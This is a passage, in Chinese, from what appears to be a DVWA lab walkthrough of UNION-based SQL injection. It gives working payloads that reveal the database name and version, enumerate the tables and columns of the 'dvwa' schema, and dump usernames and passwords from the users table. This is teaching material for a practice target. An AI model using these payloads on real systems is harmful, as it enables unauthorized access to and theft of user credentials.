- 1、2：正常返回数据
- 3：SQL 报错，说明一共**2 列**。

>
> 输入框内直接写 `#`，不需要编码为 %23；浏览器表单 POST 提交，不会把 #当成锚点。

3. union 联合查询，前面条件为假

```
-1' union select 1,2#
```

页面会打印出`1`和`2`，看到回显位。

4. 查询数据库名

```
-1' union select database(),version()#
```

5. 查询 dvwa 库所有表

```
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa'#
```

6. 查询 users 表字段

```
-1' union select 1,group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users'#
```

7. 爆出账号密码

```
-1' union select user,password from users#
```